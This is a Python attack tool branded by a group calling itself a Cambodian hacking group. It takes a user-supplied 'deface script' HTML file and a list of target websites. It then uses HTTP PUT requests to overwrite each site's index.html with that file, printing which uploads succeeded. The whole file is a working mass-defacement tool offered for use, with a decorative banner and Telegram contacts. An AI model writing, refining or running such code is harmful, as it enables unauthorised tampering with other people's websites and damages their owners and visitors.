#-*- coding: utf-8 -*-
try:
   import os
   import sys
   import time
   import random
   import os.path
   import requests
   import threading
except ImportError:
   exit("install requests and try again ...(pip install requests")
os.system("git pull")
os.system("clear")
red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"
colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)
banner = f"""\033[31m
                            ,-.                               
       ___,---.__          /'|`\          __,---,___          
    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.       
  ,'        |           ~'\     /`~           |        `.      
 /      ___//              `. ,'          ,  , \___      \    
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |    
|   /          /\_  `   .    |    ,      _/\          \   |   
\  |           \ \`-.___ \   |   / ___,-'/ /           |  /  
 \  \           | `._   `\\  |  //'   _,' |           /  /      
  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'     
     ``       /     \    ,='/ \`=.    /     \       ''          
             |__   /|\_,--.,-.--,--._/|\   __|                  
             /  `./  \\`\ |  |  | /,//' \,'  \                  
            /   /     ||--+--|--+-/-|     \   \                 
           |   |     /'\_\_\ | /_/_/`\     |   |                
            \   \__, \_     `~'     _/ .__/   /            
             `-._,-'   `-._______,-'   `-._,-'
\n \033[33m <=========||=> \033[31m NDTSEC GROUP HACKING CAMBODIA  \033[33m <=||=========> \033[32m    

--> \033[31m SIMPLE TOOL BY NDTSEC-MEMBER V2
\033[32m--> \033[31m USE BY YOUR OWN RISKS

[\033[32m+\033[31m]•We NDT SEC!
[\033[32m+\033[31m]•We respect human rights
[\033[32m+\033[31m]•We hate corruption
[\033[32m+\033[31m]•We remember
[\033[32m+\033[31m]•We never forget.

\n\033[1;37m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\t

   {color1}[\033[31m⭐️\033[0m\033[33m]Support us   : \033[1m https://t.me/ndtgroup_kh\033[0m

   {color1}[\033[31m⭐️\033[0m\033[33m]Telegram     : https://t.me/Zyn_sec

   {color1}[\033[31m⭐️\033[0m\033[33m]By           : Zyn.
\033[1;37m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\t


\033[33m<================•\033[31mNDT-TOOL\033[33m•================>

"""+reset+blue
def animate():
    text = "Uploading your script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i+1:], end="\r")
            time.sleep(0.1)
def eagle(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)   
   return str(ipt)
def white(script, target_file="targets.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print(" ")
        print(green+bold+"[✓]\033[0m \033[34mUploading your script to %d website...." % (len(target)), end="", flush=True)
        print(" ")
	# start the animation thread
        t = threading.Thread(target=animate)
        t.daemon = True  # allow the thread to be killed when the main program ends
        t.start()                
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/index.html", data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
                else:
                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()
def main(__bn__):
   print(__bn__)
   while True:
      try:
         print(green+'[Please put the deface script/ .html file in this same folder and type it\'s name below]'+reset+blue)
         print(' ')
         a = eagle(green+"[+]\033[0m \033[34mEnter your deface script's name \033[33m[eg: defacescript.html]\033[0m \033[34m> ")
         if not os.path.isfile(a):
            print(' ')
            print(red+bold+"	file '%s' not found in this folder !"%(a))
            print(" ")
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()
   white(a)
if __name__ == "__main__":
    main(banner)
